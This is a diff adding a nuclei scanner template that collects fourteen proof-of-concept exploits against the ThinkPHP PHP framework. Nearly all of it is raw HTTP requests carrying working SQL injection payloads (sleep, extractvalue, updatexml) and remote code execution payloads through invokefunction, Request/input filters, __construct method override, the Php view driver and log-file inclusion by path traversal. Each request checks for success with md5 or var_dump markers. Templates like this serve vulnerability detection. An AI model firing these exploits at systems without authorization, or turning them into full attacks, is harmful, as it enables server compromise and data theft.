@@ -1,0 +1,238 @@
+id: ThinkPhp_Collection_14_PoCs
+info:
+  name: ThinkPhp_Collection_14_PoCs
+  author: 51pwn
+  severity: critical
+  description: |+
+    thinkphp_view_recent_xff_sqli
+    thinkphp_request_input_rce
+    thinkphp_pay_orderid_sqli
+    thinkphp_multi_sql_leak
+    thinkphp_method_filter_code_exec
+    thinkphp_lite_code_exec
+    thinkphp_invoke_func_code_exec
+    thinkphp_index_showid_rce
+    thinkphp_index_construct_rce
+    thinkphp_driver_display_rce
+    thinkphp_debug_index_ids_sqli
+    thinkphp_construct_debug_rce
+    thinkphp_construct_code_exec
+    thinkphp_checkcode_time_sqli
+
+  reference:
+    - https://github.com/hktalent/nuclei-templates
+    - https://51pwn.com
+  tags: web,thinkphp
+
+# nuclei -duc -u http://localhost:9999 -t ./51pwn/checkGoDebug.yaml
+
+requests:
+  - raw:
+      - |+
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Content-Type: multipart/form-data; boundary=--------641902708
+        Accept-Encoding:gzip, deflate
+        Connection: close
+
+        ----------641902708
+        Content-Disposition: form-data; name="couponid"
+
+        1')UniOn SelEct slEEp(8)#
+
+        ----------641902708--
+      # end
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 8" #判断延时时间
+        condition: and
+  - raw:
+      - |+
+        GET {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+      - |+
+        GET /index.php?s={{myhref}}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333 HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "56540676a129760a3"
+        condition: or
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 301 && status_code != 302'
+    iterate-all: true
+    extractors:
+      - type: regex
+        part: body
+        name: myhref
+        group: 1
+        internal: true
+        regex:
+          - '<a[\\s+]href="/([A-Za-z]+)'
+        
+  - raw:
+      - |+
+        GET /index.php?s=/home/article/view_recent/name/1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        X-Forwarded-For: 1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#
+        Pragma:no-cache
+        Accept-Encoding:gzip, deflate
+        Connection: close
+        
+      - |+
+        GET /index.php?s=index/\think\Request/input&filter=var_dump&data=f7e0b956540676a129760a3eae309294 HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Accept-Encoding:gzip, deflate
+        Connection: close
+
+      - |+
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Content-Type: application/json
+        Accept-Encoding:gzip, deflate
+        Connection: close
+
+        {"server[REQUEST_METHOD]":"56540676a129760a3","filter[]":"var_dump","_method":"__construct"}     
+      - |+
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Content-Type: application/json
+        Accept-Encoding:gzip, deflate
+        Connection: close
+
+        {"filter[]":"var_dump","method":"get","_method":"__construct","server[REQUEST_METHOD]":"56540676a129760a3"} 
+      - |+
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Content-Type: application/json
+        Accept-Encoding:gzip, deflate
+        Connection: close
+
+        {"c":"var_dump","f":"4e5e5d7364f443e28fbf0d3ae744a59a","_method":"filter"}
+
+      - |+
+        GET /index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Accept-Encoding:gzip, deflate
+        Connection: close
+
+      - |+
+        GET /index.php?s=my-show-id-\x5C..\x5CTpl\x5C8edy\x5CHome\x5Cmy_1{~var_dump(md5(2333))}] HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Accept-Encoding:gzip, deflate
+        Connection: close
+      - |+
+        GET /index.php?s=index/\think\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Accept-Encoding:gzip, deflate
+        Connection: close
+      - |+
+        GET /index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Accept-Encoding:gzip, deflate
+        Connection: close
+      - |+
+        GET /index.php?s=index/index/index HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding:gzip, deflate
+        Connection: close
+
+        s=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump
+      # datetime.datetime.now().strftime("%Y_%m_%d")[2:]
+      - |+
+        GET /index.php?s=my-show-id-\x5C..\x5CRuntime\x5CLogs\x5C{{substr(date("%Y-%M-%D"),2)}}.log HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Pragma:no-cache
+        Accept-Encoding:gzip, deflate
+        Connection: close
+    req-condition: true
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # - type: status
+      #   status:
+      #     - 200
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 301 && status_code != 302'
+      - type: word
+        part: body
+        words:
+          - 'SQL syntax'
+          - "56540676a129760"
+          - "56540676a129760a"
+          - "56540676a129760a3"
+          - '4e5e5d7364f443e28fbf0d3ae744a59a'
+        condition: or
+
+  - raw:
+      - |+
+        GET /{{mypaths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept:*/*
+        Pragma:no-cache
+        Accept-Encoding:gzip, deflate
+        Connection: close
+      # end payload
+    payloads:
+      mypaths:
+        - "index.php?s=/home/shopcart/getPricetotal/tag/1%27"
+        - "index.php?s=/home/shopcart/getpriceNum/id/1%27"
+        - "index.php?s=/home/user/cut/id/1%27"
+        - "index.php?s=/home/service/index/id/1%27"
+        - "index.php?s=/home/pay/chongzhi/orderid/1%27"
+        - "index.php?s=/home/order/complete/id/1%27"
+        - "index.php?s=/home/order/detail/id/1%27"
+        - "index.php?s=/home/order/cancel/id/1%27"
+
+    attack: pitchfork 
+    unsafe: true
+
+    req-condition: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 301 && status_code != 302'
+      - type: regex
+        part: body
+        regex:
+          - '56540676a129760a'
+          - "SQL syntax"
+        condition: or
+
+     
